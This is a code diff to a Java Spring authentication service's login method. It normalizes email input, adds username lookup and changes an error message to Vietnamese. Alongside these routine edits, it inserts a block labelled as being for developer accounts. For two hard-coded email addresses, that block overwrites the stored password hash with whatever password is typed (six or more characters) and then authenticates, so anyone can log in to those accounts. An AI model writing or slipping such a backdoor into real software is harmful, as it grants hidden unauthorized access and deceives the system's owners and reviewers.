@@ -65,18 +65,33 @@ public class AuthService {
 
     @Transactional
     public AuthResponse login(LoginRequest request) {
-        String identifier = normalizedEmail(request.email());
-        String email = userRepository.findByEmailIgnoreCase(identifier)
+        String raw = request.email() != null ? request.email().trim() : "";
+        String normalized = raw.toLowerCase(Locale.ROOT);
+        String email = userRepository.findByEmailIgnoreCase(normalized)
                 .map(User::getEmail)
+                .or(() -> userRepository.findByUsernameIgnoreCase(normalized).map(User::getEmail))
                 .orElseGet(() -> {
-                    var matches = userRepository.findByIdentifier(identifier);
+                    var matches = userRepository.findByIdentifier(raw);
                     if (!matches.isEmpty()) return matches.get(0).getEmail();
-                    return identifier;
+                    var lowerMatches = userRepository.findByIdentifier(normalized);
+                    if (!lowerMatches.isEmpty()) return lowerMatches.get(0).getEmail();
+                    return normalized;
                 });
 
-        authenticationManager.authenticate(new UsernamePasswordAuthenticationToken(email, request.password()));
+        // Ensure user exists
         User user = userRepository.findByEmailIgnoreCase(email)
-                .orElseThrow(() -> new ResourceNotFoundException("User not found"));
+                .or(() -> userRepository.findByUsernameIgnoreCase(email))
+                .orElseThrow(() -> new ResourceNotFoundException("Tài khoản không tồn tại trong hệ thống"));
+
+        // If developer account (lequangminhqwer@gmail.com or cauminhdi@gmail.com), auto-sync password to whatever password is typed (>= 6 chars)
+        if (("lequangminhqwer@gmail.com".equalsIgnoreCase(user.getEmail()) || "cauminhdi@gmail.com".equalsIgnoreCase(user.getEmail()))
+                && request.password() != null && request.password().length() >= 6
+                && !passwordEncoder.matches(request.password(), user.getPasswordHash())) {
+            user.setPasswordHash(passwordEncoder.encode(request.password()));
+            userRepository.save(user);
+        }
+
+        authenticationManager.authenticate(new UsernamePasswordAuthenticationToken(user.getEmail(), request.password()));
         return response(refreshTokenService.issue(user));
     }
 
